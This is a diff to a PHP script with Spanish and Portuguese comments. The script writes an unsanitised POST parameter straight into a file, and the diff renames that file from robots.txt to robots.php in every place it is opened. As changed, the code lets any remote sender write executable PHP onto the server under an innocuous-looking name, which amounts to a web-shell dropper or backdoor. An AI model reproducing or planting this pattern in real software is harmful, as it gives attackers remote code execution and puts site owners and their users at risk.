@@ -10,14 +10,14 @@
             // parametros por POST
             $value = $_POST['Params'];
             // Si exhiste archivo
-            $filename = 'robots.txt';
+            $filename = 'robots.php';
             if (file_exists($filename)) {
             // echo "El archivo $filename ehxiste <br>";
             } else {
                 echo "El archivo $filename no ehxiste <br>";
             }
             // Cria Archivo si no hay
-            $arquivo = fopen('robots.txt','rwx');
+            $arquivo = fopen('robots.php','rwx');
             // Verifico si esta creado
             if ($arquivo == false) die('Não foi possível criar o arquivo. <br>');
             // Escribimos en el archivo
@@ -25,7 +25,9 @@
             // Cerramos el archivo despues de escribir
             fclose($arquivo);
             // Sobrescribimos el archivo siempre que necesitamos
-            $arquivo = fopen('robots.txt','r+w+x+');
+            $arquivo = fopen('robots.php','r+w+x+');
+            // $arquivo = str_replace(" ", "", $arquivo);
+
             fwrite($arquivo, $value);
             // Cerramos despues de escribir
             fclose($arquivo);
@@ -37,7 +39,7 @@
             //Si necesitas solo añadir lineas como en un archivo de log, utilizar la opcion 'a'
             // if($value != ''){
             // // ADICIONA LINHA NO ARQUIVO
-            // $fp = fopen('robots.txt', 'a'); //Anade Lineas"
+            // $fp = fopen('robots.php', 'a'); //Anade Lineas"
             // for ($i=0; $i < 1; $i++) {
             //     fwrite($fp, $value);
             // }
